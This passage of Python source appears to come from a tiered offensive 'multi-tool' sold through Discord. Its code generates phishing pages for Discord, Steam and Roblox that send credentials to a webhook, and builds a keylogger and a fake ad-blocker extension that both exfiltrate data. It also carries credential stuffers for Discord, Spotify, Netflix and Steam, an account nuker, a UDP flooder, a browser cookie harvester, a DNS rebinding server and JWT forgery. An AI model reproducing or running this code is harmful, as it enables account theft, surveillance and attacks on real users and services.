            fp = os.path.join(bp, f)
            if os.path.isfile(fp):
                try: os.remove(fp); t += 1
                except Exception: pass
            elif os.path.isdir(fp):
                try: shutil.rmtree(fp); t += 1
                except Exception: pass
        print(f"  {G}[OK]{RST} {bn}")
    print(f"  {G}[OK]{RST} {t} files"); _hist_log("HWID","Browser",str(t)); pause()
def hw_guide():
    banner_s("HWID GUIDE")
    print(f"""
{R}+--[ HWID Bypass Guide ]-------------+{RST}
{Y}LEVEL 1 -- Soft{RST}
  {G}1.{RST} VPN   {G}2.{RST} New account   {G}3.{RST} Clear AppData
  {G}4.{RST} Machine GUID   {G}5.{RST} MAC

{Y}LEVEL 2 -- Hard{RST}
  + Volume Serial + BIOS/Disk + Prefetch + new profile

{Y}LEVEL 3 -- Kernel{RST}
  + Fresh Windows + new NIC/SSD + VPN + new phone

{Y}TOOLS:{RST}
  {G}→{RST} VolumeID (Sysinternals)
  {G}→{RST} Technitium MAC
  {G}→{RST} ProxyCap / Proxifier
{R}+-------------------------------------+{RST}
""")
    pause()

# ========================================================================
# VIP
# ========================================================================
def _require_tier(t):
    if _has_tier(t): return True
    print(f"  {R}[X]{RST} {t.upper()} required. Current: {W}{_TIER}{RST}")
    print(f"  {DIM}Join: {DISCORD_LINK}{RST}"); pause(); return False

def vip_menu():
    banner_s("VIP PANEL")
    if not _require_tier("vip"): return
    while True:
        menu_box(f"*** VIP [{_TIER.upper()}] ***", [
            ("1","Mass Token Check"),("2","Account Nuker"),("3","IP Stresser"),
            ("4","Phishing Builder"),("5","Cred Stuffer"),("6","Proxy Scrape"),
            ("7","Mass WH Nuke"),("8","Grabber Gen"),("9","RAT Builder"),
            ("10","QR Phishing"),("11","Mass Token Info"),("12","Roblox Check"),
            ("13","Mass IP Scan"),("14","Email Bomber"),("15","Keylogger"),
            ("16","WH Info+Test"),("17","Nitro Sniper"),("18","Cookie Harvest"),
            ("19","Roblox Enrich"),("0", T("back"))])
        c = input(f"  {R}VIP>{RST} ").strip()
        fns = {"1": vip_tokens, "2": vip_nuker, "3": vip_stress, "4": vip_phish,
               "5": vip_stuffer, "6": vip_proxy, "7": vip_wh_nuke, "8": vip_grabber,
               "9": vip_rat, "10": vip_qr, "11": vip_tinfo, "12": vip_rbx,
               "13": vip_ipscan, "14": vip_email, "15": vip_keylog,
               "16": vip_wh_info, "17": vip_sniper, "18": vip_session, "19": vip_rbx_enrich}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def vip_tokens():
    banner_s("MASS TOKEN CHECK"); p = ask("File:")
    if not os.path.isfile(p): print(f"{ERR} {T('not_found')}"); pause(); return
    valid = []
    for t in [l.strip() for l in open(p, errors="ignore") if l.strip()]:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=4)
            if r.status_code == 200:
                d = r.json()
                print(f"  {G}[VALID]{RST} {d.get('username')} | {d.get('email','?')}")
                valid.append(f"{d.get('username')} | {t}")
        except Exception: pass
        time.sleep(0.2)
    if valid: out("mass_tokens_valid.txt", "\n".join(valid))
    print(f"\n{OK} {len(valid)} valid."); _hist_log("VIP","TokenCheck",str(len(valid))); pause()
def vip_nuker():
    banner_s("ACCOUNT NUKER"); e = ask("Email:"); p = ask("Password:")
    try:
        r = requests.post("https://discord.com/api/v9/auth/login",
                          json={"login": e, "password": p, "undelete": False, "captcha_key": None},
                          headers={"Content-Type":"application/json"}, timeout=8).json()
        tk = r.get("token")
        if not tk: print(f"{ERR} Login failed."); pause(); return
        print(f"{OK} Token obtained.")
        if ask("Type NUKE:") != "NUKE": pause(); return
        for g in requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(tk), timeout=8).json():
            ep = f"guilds/{g['id']}" if g.get("owner") else f"users/@me/guilds/{g['id']}"
            requests.delete(f"https://discord.com/api/v9/{ep}", headers=_dh(tk), timeout=8); time.sleep(0.3)
        print(f"\n{OK} Nuked."); _hist_log("VIP","Nuke",e)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def vip_stress():
    h = ask("Target:"); p = ask_int("Port:", 80); dur = ask_int("Duration:", 15); th = ask_int("Threads:", 20)
    def f(stop, c):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = os.urandom(1024)
        while not stop["v"]:
            try: s.sendto(pl, (h, p)); c[0] += 1
            except Exception: pass
    _flood("IP STRESSER", f, dur, th)
def vip_phish():
    banner_s("PHISHING BUILDER")
    ch = ask("[1]Discord [2]Steam [3]Roblox [4]Custom:", "1")
    wh = ask("Webhook:"); rd = ask("Redirect:", "https://google.com")
    tpl = {"1":("Discord","#5865F2","Login to Discord","Email","Password"),
           "2":("Steam","#1b2838","Sign in to Steam","Account","Password"),
           "3":("Roblox","#cc0000","Login to Roblox","Username","Password"),
           "4":("Custom","#000000","Login","Username","Password")}
    name, color, title, f1, f2 = tpl.get(ch, tpl["4"])
    if ch == "4":
        title = ask("Title:", "Login"); f1 = ask("Field 1:", "Username")
    html = f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{title}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{background:{color};display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif}}
.card{{background:#fff;border-radius:8px;padding:40px 36px;width:100%;max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.4)}}
h2{{text-align:center;color:#222;margin-bottom:24px}}label{{display:block;color:#555;font-size:13px;font-weight:600;margin-bottom:6px;text-transform:uppercase}}
input{{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:5px;font-size:15px;margin-bottom:18px;outline:none}}
button{{width:100%;padding:13px;background:{color};color:#fff;border:none;border-radius:5px;font-size:16px;font-weight:700;cursor:pointer}}
.err{{color:red;font-size:13px;text-align:center;margin-top:10px;display:none}}</style></head>
<body><div class="card"><h2>{title}</h2><form id="f"><label>{f1}</label><input id="f1" required>
<label>{f2}</label><input type="password" id="f2" required><button>Login</button><div class="err" id="e">Invalid credentials.</div></form></div>
<script>
const WH="{wh}";const RD="{rd}";
document.getElementById("f").addEventListener("submit",async e=>{{e.preventDefault();
const v1=document.getElementById("f1").value;const v2=document.getElementById("f2").value;let ip="?";
try{{const r=await fetch("https://api.ipify.org?format=json");ip=(await r.json()).ip;}}catch(e){{}}
try{{await fetch(WH,{{method:"POST",headers:{{"Content-Type":"application/json"}},
body:JSON.stringify({{embeds:[{{title:"c6R6",color:0xFF0000,fields:[
{{name:"Site",value:"{name}",inline:true}},{{name:"IP",value:ip,inline:true}},
{{name:"{f1}",value:v1}},{{name:"{f2}",value:v2}}]}}]}})}});}}catch(e){{}}
document.getElementById("e").style.display="block";
setTimeout(()=>{{window.location.href=RD;}},1500);}});
</script></body></html>'''
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/phishing_{_slug(name)}.html"; open(p, "w", encoding="utf-8").write(html)
    print(f"\n{OK} → {Y}{p}{RST}\n  {DIM}python -m http.server 8080{RST}")
    _hist_log("VIP","Phish",name); pause()
def vip_stuffer():
    banner_s("CRED STUFFER"); cp = ask("Combo list:")
    if not os.path.isfile(cp): print(f"{ERR} {T('not_found')}"); pause(); return
    hits = []
    for c in [l.strip() for l in open(cp, errors="ignore") if ":" in l]:
        e, p = c.split(":", 1)
        try:
            r = requests.post("https://discord.com/api/v9/auth/login",
                              json={"login": e, "password": p}, timeout=5)
            if r.status_code == 200 and r.json().get("token"):
                print(f"  {G}[HIT]{RST} {e}:{p}"); hits.append(f"{e}:{p}")
        except Exception: pass
        time.sleep(0.5)
    if hits: out("credential_hits.txt", "\n".join(hits))
    print(f"\n{OK} {len(hits)} hits."); _hist_log("VIP","Stuff",str(len(hits))); pause()
def vip_proxy():
    banner_s("PROXY SCRAPE"); all_ = set()
    for src in ["https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"]:
        try:
            for line in requests.get(src, timeout=8).text.split("\n"):
                if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}", line.strip()):
                    all_.add(line.strip())
        except Exception: pass
    print(f"\n{OK} {len(all_)} proxies"); out("proxies_all.txt", "\n".join(all_))
    _hist_log("VIP","Proxy",str(len(all_))); pause()
def vip_wh_nuke():
    banner_s("WH NUKER"); p = ask("Webhooks file:")
    if not os.path.isfile(p): print(f"{ERR} {T('not_found')}"); pause(); return
    hooks = [l.strip() for l in open(p, errors="ignore") if l.strip().startswith("https://discord.com/api/webhooks")]
    mode = ask("[1]Spam [2]Del [3]Both:", "1"); msg = ask("Message:", "c6R6") if mode in ["1","3"] else ""
    n = ask_int("Per webhook:", 5)
    for wh in hooks:
        if mode in ["1","3"]:
            for _ in range(n):
                r = requests.post(wh, json={"content": msg}, timeout=8)
                print(f"  {G if r.status_code == 204 else R}[SPAM]{RST} {r.status_code}"); time.sleep(0.3)
        if mode in ["2","3"]:
            r = requests.delete(wh, timeout=8); print(f"  {R}[DEL]{RST} {r.status_code}")
    _hist_log("VIP","WHNuke",str(len(hooks))); pause()
def vip_grabber():
    banner_s("GRABBER"); wh = ask("Webhook:"); name = ask("Output:", "grabber.py")
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"; open(p, "w", encoding="utf-8").write(_STEALER.replace("__WH__", wh))
    print(f"\n{OK} → {Y}{p}{RST}"); _hist_log("VIP","Grabber",name); _ask_exe(p); pause()
def vip_rat():
    banner_s("RAT BUILDER")
    lhost = ask("LHOST:"); lport = ask("LPORT:", "4444"); name = ask("Output:", "rat.py")
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"
    open(p, "w", encoding="utf-8").write(_RAT.replace("__HOST__", lhost).replace("__LPORT__", str(lport)))
    print(f"\n{OK} → {Y}{p}{RST}\n  {DIM}Listener: nc -lvnp {lport}{RST}")
    _hist_log("VIP","RAT",name); _ask_exe(p); pause()
def vip_qr():
    banner_s("QR PHISHING")
    try: import qrcode
    except Exception: _pip("qrcode[pil]"); import qrcode
    url = ask("URL:"); name = ask("Output:", "qr_phishing")
    os.makedirs("1-Output", exist_ok=True)
    qr = qrcode.QRCode(box_size=10, border=4); qr.add_data(url); qr.make(fit=True)
    qr.make_image(fill_color="black", back_color="white").save(f"1-Output/{name}.png")
    print(f"\n{OK} → 1-Output/{name}.png"); _hist_log("VIP","QR",url[:40]); pause()
def vip_tinfo():
    banner_s("MASS TOKEN INFO"); p = ask("File:")
    if not os.path.isfile(p): print(f"{ERR} {T('not_found')}"); pause(); return
    res = []
    for t in [l.strip() for l in open(p, errors="ignore") if l.strip()]:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=4)
            if r.status_code == 200:
                d = r.json()
                gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(t), timeout=4).json()
                gc = len(gs) if isinstance(gs, list) else 0
                print(f"  {G}[VALID]{RST} {d.get('username')} guilds:{gc}")
                res.append(f"{d.get('username')} | {t}")
        except Exception: pass
        time.sleep(0.3)
    if res: out("mass_token_info.txt", "\n".join(res))
    _hist_log("VIP","TInfo",str(len(res))); pause()
def vip_rbx():
    banner_s("ROBLOX CHECK"); p = ask("Cookies file:")
    if not os.path.isfile(p): print(f"{ERR} {T('not_found')}"); pause(); return
    v = []
    for ck in [l.strip() for l in open(p, errors="ignore") if l.strip()]:
        try:
            h = {"Cookie": f".ROBLOSECURITY={ck}"}
            r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h, timeout=5)
            if r.status_code == 200:
                d = r.json(); uid = d.get("id")
                rb = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h, timeout=5).json()
                print(f"  {G}[HIT]{RST} {d.get('name')} robux:{rb.get('robux', 0)}")
                v.append(f"{d.get('name')} | {ck}")
        except Exception: pass
        time.sleep(0.3)
    if v: out("roblox_hits.txt", "\n".join(v))
    _hist_log("VIP","RbxCheck",str(len(v))); pause()
def vip_ipscan():
    banner_s("MASS IP SCAN"); import ipaddress
    cidr = ask("CIDR:", "192.168.1.0/24"); port = ask_int("Port:", 80)
    try:
        hosts = list(ipaddress.ip_network(cidr, strict=False).hosts()); found = []
        for ip in hosts:
            s = socket.socket(); s.settimeout(0.5)
            if s.connect_ex((str(ip), port)) == 0:
                print(f"  {G}[OPEN]{RST} {ip}:{port}"); found.append(f"{ip}:{port}")
            s.close()
        if found: out(f"mass_scan_{cidr.replace('/','_')}.txt", "\n".join(found))
        _hist_log("VIP","IPScan",f"{cidr}:{len(found)}")
    except Exception as e: print(f"{ERR} {e}")
    pause()
def vip_email():
    banner_s("EMAIL BOMBER"); e = ask("Email:"); n = ask_int("Count:", 10); sent = 0
    for i in range(1, n + 1):
        for url, data in [("https://app.mailjet.com/signup", {"email": e}),
                          ("https://account.mail.ru/signup", {"Login": e})]:
            try: requests.post(url, data=data, timeout=3); sent += 1
            except Exception: pass
        print(f"  {Y}[{i}/{n}]{RST}"); time.sleep(0.5)
    print(f"\n{OK} {sent} requests."); _hist_log("VIP","EmailBomb",f"{e}:{sent}"); pause()
def vip_keylog():
    banner_s("KEYLOGGER"); wh = ask("Webhook:"); name = ask("Output:", "keylogger.py")
    kl = '''# -*- coding: utf-8 -*-
import time, threading, socket, os
WH = "__WH__"
try: import requests
except Exception:
    import subprocess as sp; sp.run(["pip","install","requests","--quiet"]); import requests
buf = []
def on_k(k):
    try:
        from pynput.keyboard import Key
        if k == Key.space: buf.append(" ")
        elif k == Key.enter: buf.append("\\n")
        elif k == Key.backspace: buf.append("[BKSP]")
        elif hasattr(k, "char") and k.char: buf.append(k.char)
    except: pass
def sender():
    while True:
        time.sleep(30)
        if not buf: continue
        t = "".join(buf); buf.clear()
        try: u = os.getlogin()
        except: u = "?"
        try: requests.post(WH, json={"embeds": [{"title": "c6R6 keylog", "color": 0xFF0000,
            "fields": [{"name": "Host", "value": socket.gethostname()},
                       {"name": "User", "value": u},
                       {"name": "Keys", "value": f"```{t[:1000]}```"}]}]}, timeout=5)
        except: pass
def main():
    try: from pynput import keyboard
    except:
        import subprocess as sp; sp.run(["pip","install","pynput","--quiet"])
        from pynput import keyboard
    threading.Thread(target=sender, daemon=True).start()
    with keyboard.Listener(on_press=on_k) as l: l.join()
main()
'''
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"; open(p, "w", encoding="utf-8").write(kl.replace("__WH__", wh))
    print(f"\n{OK} → {Y}{p}{RST}"); _hist_log("VIP","Keylog",name); _ask_exe(p); pause()
def vip_wh_info():
    banner_s("WH INFO+TEST"); wh = ask("Webhook URL:"); d = jget(wh)
    if not isinstance(d, dict) or "error" in d: print(f"{ERR} {T('invalid')}"); pause(); return
    for k, v in [("Name", d.get("name")), ("ID", d.get("id")), ("Channel", d.get("channel_id"))]:
        print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
    if ask("Test? (y/n):", "n").lower() in ("y","o"):
        try:
            r = requests.post(wh, json={"embeds": [{"title": "c6R6", "color": 0xFF0000,
                "description": "operational", "timestamp": datetime.now(timezone.utc).isoformat()}]}, timeout=5)
            print(f"{OK if r.status_code in (200,204) else ERR} {r.status_code}")
        except Exception as e: print(f"{ERR} {e}")
    _hist_log("VIP","WhInfo",wh[:40]); pause()
def vip_sniper():
    banner_s("NITRO SNIPER"); t = ask("Token:"); n = ask_int("Duration:", 60)
    found = []; start = time.time(); c = 0
    try:
        while time.time() - start < n:
            code = "".join(random.choices(string.ascii_letters + string.digits, k=16)); c += 1
            try:
                r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", headers=_dh(t), timeout=3)
                if r.status_code == 200:
                    u = f"https://discord.gift/{code}"; print(f"  {G}[FOUND]{RST} {u}"); found.append(u)
            except Exception: pass
            time.sleep(0.05)
    except KeyboardInterrupt: pass
    print(f"\n{OK} {len(found)} found ({c} tries).")
    if found: out("nitro_sniped.txt", "\n".join(found))
    _hist_log("VIP","Sniper",str(len(found))); pause()
def vip_session():
    banner_s("COOKIE HARVEST")
    if not _is_win(): print(f"{ERR} Windows only."); pause(); return
    lo = os.environ.get("LOCALAPPDATA",""); ad = os.environ.get("APPDATA","")
    targets = {"Chrome": os.path.join(lo,"Google","Chrome","User Data","Default"),
               "Edge": os.path.join(lo,"Microsoft","Edge","User Data","Default"),
               "Brave": os.path.join(lo,"BraveSoftware","Brave-Browser","User Data","Default"),
               "Opera": os.path.join(ad,"Opera Software","Opera Stable")}
    found = 0
    for name, path in targets.items():
        ck = os.path.join(path, "Cookies")
        if os.path.isfile(ck):
            try:
                os.makedirs("1-Output", exist_ok=True)
                shutil.copy2(ck, f"1-Output/cookies_{name.lower()}.db"); found += 1
                print(f"  {G}[OK]{RST} {name}")
            except Exception: pass
    print(f"\n{OK} {found}."); _hist_log("VIP","Session",str(found)); pause()
def vip_rbx_enrich():
    banner_s("ROBLOX ENRICH"); ck = ask(".ROBLOSECURITY:"); h = {"Cookie": f".ROBLOSECURITY={ck}"}
    try:
        r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h, timeout=6)
        if r.status_code != 200: print(f"{ERR} {T('invalid')}"); pause(); return
        uid = r.json()["id"]; name = r.json()["name"]
        rb = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h, timeout=6).json()
        fr = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", headers=h, timeout=6).json()
        prem = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=h, timeout=6).status_code == 200
        print(f"\n  {Y}Username{RST}: {G}{name}{RST}\n  {Y}Robux{RST}: {G}{rb.get('robux',0)}{RST}")
        print(f"  {Y}Premium{RST}: {G if prem else R}{prem}{RST}\n  {Y}Friends{RST}: {W}{fr.get('count',0)}{RST}")
        _hist_log("VIP","RbxEnrich",name)
    except Exception as e: print(f"{ERR} {e}")
    pause()

# ========================================================================
# VIP+
# ========================================================================
def vipx_menu():
    banner_s("VIP+ PANEL")
    if not _require_tier("vip+"): return
    while True:
        menu_box(f"*** VIP+ [{_TIER.upper()}] ***", [
            ("1","Multi-Site Combo"),("2","Rate Limiter"),("3","WAF Fingerprint"),
            ("4","DNS Rebinding"),("5","Ext Dropper"),("6","Git Secret Miner"),
            ("7","JWT Forge"),("8","Subdomain Takeover"),("9","PW Pattern"),
            ("10","Cloud Metadata"),("11","TLS Randomizer"),("12","Captcha Bypass"),
            ("13","WebSocket C2"),("14","Mass Email Verify"),("15","Dork Forge"),
            ("16","Friend Graph"),("17","Session Link"),("18","Token Monitor"),
            ("19","Email Footprint"),
            ("20",f"{PLUS_COL}★{RST} Payload Obfuscator"),
            ("21",f"{PLUS_COL}★{RST} Process Hollow Gen"),
            ("22",f"{PLUS_COL}★{RST} Reverse Shell Builder"),
            ("23",f"{PLUS_COL}★{RST} Keymap Stealer"),
            ("24",f"{PLUS_COL}★{RST} IP Rotator"),
            ("25",f"{PLUS_COL}★{RST} Discord Stealer Gen"),
            ("0", T("back"))], color=PLUS_COL)
        c = input(f"  {PLUS_COL}VIP+>{RST} ").strip()
        fns = {"1": vx_combo, "2": vx_ratelim, "3": vx_waf, "4": vx_dnsrebind,
               "5": vx_ext, "6": vx_gitmine, "7": vx_jwt, "8": vx_takeover,
               "9": vx_pwpat, "10": vx_cloudmeta, "11": vx_tls, "12": vx_captcha,
               "13": vx_wsc2, "14": vx_emailverify, "15": vx_dork, "16": vx_friendgraph,
               "17": vx_sesslink, "18": vx_tokmon, "19": vx_emailfp,
               "20": vx_obfuscator, "21": vx_hollow, "22": vx_revshell,
               "23": vx_keymap, "24": vx_rotator, "25": vx_dcstealer}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def vx_combo():
    banner_s("MULTI-SITE COMBO"); cp = ask("Combo list:")
    if not os.path.isfile(cp): print(f"{ERR} {T('not_found')}"); pause(); return
    th = ask_int("Threads:", 15)
    sites = {"1": ["discord"], "2": ["spotify"], "3": ["netflix"], "4": ["steam"],
             "6": ["discord","spotify","netflix","steam"]}.get(
        ask("Target [1]DC [2]Spot [3]Netflix [4]Steam [6]All:", "6"), ["discord"])
    combos = [l.strip() for l in open(cp, errors="ignore") if ":" in l and l.strip()]
    def _t_dc(u, p):
        try: return requests.post("https://discord.com/api/v9/auth/login",
                                  json={"login": u, "password": p}, timeout=6).status_code == 200
        except Exception: return False
    def _t_sp(u, p):
        try: return requests.post("https://accounts.spotify.com/api/login",
                                  data={"username": u, "password": p, "remember": "true"},
                                  headers={"User-Agent":"Mozilla/5.0"}, timeout=6).status_code == 200
        except Exception: return False
    def _t_nf(u, p):
        try:
            r = requests.post("https://www.netflix.com/api/login",
                              json={"userLoginName": u, "password": p}, timeout=6)
            return r.status_code == 200 and "error" not in r.text.lower()[:200]
        except Exception: return False
    def _t_st(u, p):
        try: return requests.post("https://store.steampowered.com/login/dologin/",
                                  data={"username": u, "password": p, "donotcache": int(time.time()*1000)},
                                  timeout=6).json().get("success", False)
        except Exception: return False
    testers = {"discord": _t_dc, "spotify": _t_sp, "netflix": _t_nf, "steam": _t_st}
    import concurrent.futures
    hits = {s: [] for s in sites}
    def worker(c):
        u, p = c.split(":", 1); loc = {}
        for s in sites:
            try:
                if testers[s](u, p): loc[s] = c; print(f"  {G}[HIT {s.upper()}]{RST} {c}")
            except Exception: pass
            time.sleep(0.2)
        return loc
    with concurrent.futures.ThreadPoolExecutor(max_workers=th) as ex:
        for res in ex.map(worker, combos):
            for s, c in res.items(): hits[s].append(c)
    total = 0
    for s, lst in hits.items():
        if lst: out(f"combo_hits_{s}.txt", "\n".join(lst)); total += len(lst)
    print(f"\n{OK} {total} hits."); _hist_log("VIP+","Combo",str(total)); pause()
def vx_ratelim():
    banner_s("RATE LIMITER"); url = ask("URL:"); method = ask("Method (GET/POST):", "GET").upper()
    best = None
    for d in [0.05, 0.1, 0.2, 0.5, 1.0]:
        codes = []
        for _ in range(20):
            try:
                r = requests.get(url, timeout=5) if method == "GET" else requests.post(url, timeout=5)
                codes.append(r.status_code)
            except Exception: codes.append(0)
            time.sleep(d)
        rl = sum(1 for c in codes if c == 429); ok = sum(1 for c in codes if 200 <= c < 300)
        print(f"  delay={d}s  200={ok}/20  429={rl}/20")
        if rl == 0 and best is None: best = d
    print(f"\n{OK} Optimal: {G}{best or '?'}s{RST}")
    _hist_log("VIP+","RateLim",str(best)); pause()
def vx_waf():
    banner_s("WAF FINGERPRINT"); url = ask("Target URL:")
    try: h0 = {k.lower(): v for k, v in requests.get(url, timeout=8).headers.items()}
    except Exception as e: print(f"{ERR} {e}"); pause(); return
    sigs = {"Cloudflare": ["cf-ray"], "AWS": ["x-amzn-requestid"], "Akamai": ["akamai-grn"],
            "Sucuri": ["x-sucuri-id"], "Fastly": ["x-fastly-request-id"]}
    detected = []
    for name, sigs_l in sigs.items():
        for s in sigs_l:
            if s in h0 or any(s in v.lower() for v in h0.values()):
                detected.append(name); break
    for d in set(detected): print(f"  {R}[WAF]{RST} {d}")
    blocked = 0
    for name, pl in [("SQL","?id=1' OR '1'='1"),("XSS","?q=<script>alert(1)</script>"),("LFI","?file=../../etc/passwd")]:
        try:
            r = requests.get(url + pl, timeout=5)
            hit = r.status_code in (403,406,429,501)
            if hit: blocked += 1
            print(f"  {R if hit else DIM}[{'BLOCKED' if hit else '---'}]{RST} {name}")
        except Exception: pass
    _hist_log("VIP+","WAF",f"{url}:{len(detected)}"); pause()
def vx_dnsrebind():
    banner_s("DNS REBINDING"); domain = ask("Domain:", "rebind.local")
    ip1 = ask("IP 1:"); ip2 = ask("IP 2:", "127.0.0.1")
    if not ip1: print(f"{ERR} IP required."); pause(); return
    port = ask_int("Port:", 53)
    srv = f'''import socket, struct, threading, time
DOMAIN = "{domain}"; IP1 = "{ip1}"; IP2 = "{ip2}"; PORT = {port}
flip = [0]
def parse_qname(data, off):
    parts = []
    while True:
        ln = data[off]
        if ln == 0: break
        off += 1; parts.append(data[off:off+ln].decode("ascii", errors="ignore")); off += ln
    return ".".join(parts).lower(), off + 1
def handle(data, addr, sock):
    try:
        qname, off = parse_qname(data, 12)
        if DOMAIN not in qname: return
        qtype = struct.unpack(">H", data[off:off+2])[0]
        tid = data[:2]; flags = b"\\x81\\x80"
        header = tid + flags + b"\\x00\\x01" + (b"\\x00\\x01" if qtype == 1 else b"\\x00\\x00") + b"\\x00\\x00" + b"\\x00\\x00"
        q_end = data[12:].find(b"\\x00")
        question = data[12:12 + q_end + 5]
        if qtype != 1: sock.sendto(header + question, addr); return
        flip[0] = (flip[0] + 1) % 2
        ip = IP1 if flip[0] == 0 else IP2
        answer = b"\\xc0\\x0c\\x00\\x01\\x00\\x01" + struct.pack(">I", 0) + b"\\x00\\x04" + socket.inet_aton(ip)
        sock.sendto(header + question + answer, addr)
    except Exception: pass
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", PORT))
print(f"DNS Rebind :{{PORT}} for {{DOMAIN}}")
while True:
    try:
        d, a = s.recvfrom(512)
        threading.Thread(target=handle, args=(d, a, s), daemon=True).start()
    except KeyboardInterrupt: break
'''
    os.makedirs("1-Output", exist_ok=True)
    p = "1-Output/dns_rebind.py"; open(p, "w").write(srv)
    print(f"\n{OK} → {Y}{p}{RST}"); _hist_log("VIP+","DNS",domain); pause()
def vx_ext():
    banner_s("EXT DROPPER"); wh = ask("Webhook:"); name = ask("Extension:", "AdBlock Plus")
    base = f"1-Output/ext_{_slug(name)}"; os.makedirs(base, exist_ok=True)
    json.dump({"manifest_version":3,"name":name,"version":"1.0.0",
               "description":"High-performance ad blocker",
               "permissions":["cookies","storage","tabs","webRequest","<all_urls>","scripting"],
               "host_permissions":["<all_urls>"], "background":{"service_worker":"bg.js"},
               "action":{"default_popup":"popup.html"}},
              open(f"{base}/manifest.json","w"), indent=2)
    bg = f'''const WEBHOOK="{wh}";
async function collect(){{
    const out={{cookies:[],ts:Date.now()}};
    try{{const cks=await chrome.cookies.getAll({{}});
        out.cookies=cks.map(c=>`${{c.domain}} | ${{c.name}} = ${{c.value.slice(0,80)}}`);}}catch(e){{}}
    try{{await fetch(WEBHOOK,{{method:"POST",headers:{{"Content-Type":"application/json"}},
        body:JSON.stringify({{embeds:[{{title:"ext harvest",color:0xFF0000,
            fields:[{{name:"Cookies",value:"```"+out.cookies.slice(0,20).join("\\n").slice(0,1000)+"```"}}],
            timestamp:new Date().toISOString()}}]}})}});}}catch(e){{}}
}}
chrome.runtime.onInstalled.addListener(collect);
setInterval(collect,5*60*1000);
'''
    open(f"{base}/bg.js","w").write(bg)
    open(f"{base}/popup.html","w").write(f'<!DOCTYPE html><html><body style="font-family:sans-serif"><h3>{name}</h3><p>Protection active</p></body></html>')
    print(f"\n{OK} → {Y}{base}/{RST}"); _hist_log("VIP+","Ext",name); pause()
def vx_gitmine():
    banner_s("GIT MINER"); repo = ask("Repo URL:")
    if not repo: pause(); return
    tmp = f"1-Output/_gitmine_{int(time.time())}"
    if subprocess.run(["git","clone","--bare","--quiet",repo,tmp], capture_output=True, timeout=120).returncode != 0:
        print(f"{ERR} clone failed."); pause(); return
    pats = {"AWS": r"AKIA[0-9A-Z]{16}", "GoogleAPI": r"AIza[0-9A-Za-z\-_]{35}",
            "GitHub": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
            "Discord": r"[MN][A-Za-z0-9]{23,25}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}",
            "Stripe": r"sk_live_[0-9a-zA-Z]{24,}",
            "PEM": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
            "JWT": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"}
    try: log = subprocess.run(["git","--git-dir",tmp,"log","--all","-p","--no-color"],
                              capture_output=True, text=True, timeout=300).stdout
    except Exception as e: print(f"{ERR} {e}"); shutil.rmtree(tmp, ignore_errors=True); pause(); return
    total = 0
    for name, pat in pats.items():
        seen = set()
        for m in re.finditer(pat, log):
            v = m.group(0)[:120]
            if v in seen: continue
            seen.add(v); total += 1
            if len(seen) <= 5: print(f"  {R}[{name}]{RST} {Y}{v[:80]}{RST}")
        if seen: out(f"gitmine_{name.lower()}.txt", "\n".join(seen))
    shutil.rmtree(tmp, ignore_errors=True)
    print(f"\n{OK} {total} unique secrets."); _hist_log("VIP+","GitMine",str(total)); pause()
def vx_jwt():
    banner_s("JWT FORGE"); c = ask("[1]Analyze [2]Alg:none [3]Kid inject [4]HMAC brute:", "1")
    if c in ("1","2","3"):
        tok = ask("JWT:"); parts = tok.split(".")
        if len(parts) != 3: print(f"{ERR} {T('invalid')}"); pause(); return
        dp = lambda x: json.loads(base64.urlsafe_b64decode((x + "=" * ((4 - len(x) % 4) % 4)).encode()))
        try: header = dp(parts[0]); payload = dp(parts[1])
        except Exception as e: print(f"{ERR} {e}"); pause(); return
        print(f"  {Y}Header{RST} : {json.dumps(header)[:300]}")
        print(f"  {Y}Payload{RST}: {json.dumps(payload)[:500]}")
        forged = ""
        if c == "2":
            h = dict(header); h["alg"] = "none"
            h_b64 = base64.urlsafe_b64encode(json.dumps(h, separators=(",", ":")).encode()).decode().rstrip("=")
            p = dict(payload); p["admin"] = True
            p_b64 = base64.urlsafe_b64encode(json.dumps(p, separators=(",", ":")).encode()).decode().rstrip("=")
            forged = f"{h_b64}.{p_b64}."
        elif c == "3":
            kid = ask("kid value:", "../../../../dev/null")
            h = dict(header); h["kid"] = kid; h["alg"] = "HS256"
            h_b64 = base64.urlsafe_b64encode(json.dumps(h, separators=(",", ":")).encode()).decode().rstrip("=")
            p = dict(payload); p["admin"] = True
            p_b64 = base64.urlsafe_b64encode(json.dumps(p, separators=(",", ":")).encode()).decode().rstrip("=")
            import hmac as _h
